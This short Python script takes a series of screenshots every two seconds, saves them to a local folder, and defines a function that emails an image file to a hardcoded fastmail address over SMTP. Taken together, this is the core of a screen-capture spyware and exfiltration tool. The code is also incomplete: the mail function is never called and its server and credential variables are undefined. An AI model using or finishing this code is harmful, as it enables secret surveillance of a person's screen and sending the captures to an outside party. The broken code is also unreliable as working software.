import pyautogui
import time
import os 
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

def SendMail(ImgFileName):
   with open(ImgFileName, 'rb') as f:
       img_data = f.read()

   msg = MIMEMultipart()
   msg['Subject'] = 'subject'
   msg['From'] = 'dupagrygowskiego@fastmail.com'
   msg['To'] = 'dupagrygowskiego@fastmail.com'

   text = MIMEText("test")
   msg.attach(text)
   image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
   msg.attach(image)

   s = smtplib.SMTP(Server, Port)
   s.ehlo()
   s.starttls()
   s.ehlo()
   s.login(UserName, UserPassword)
   s.sendmail(From, To, msg.as_string())
   s.quit()

print("---")
os.mkdir("tmp")

i = 1
while i < 10:
    screenshot = pyautogui.screenshot()
    screenshot.save(f"tmp/{i}.png")
    print(f"screen captured {i}")
    i=i+1
    time.sleep(2)

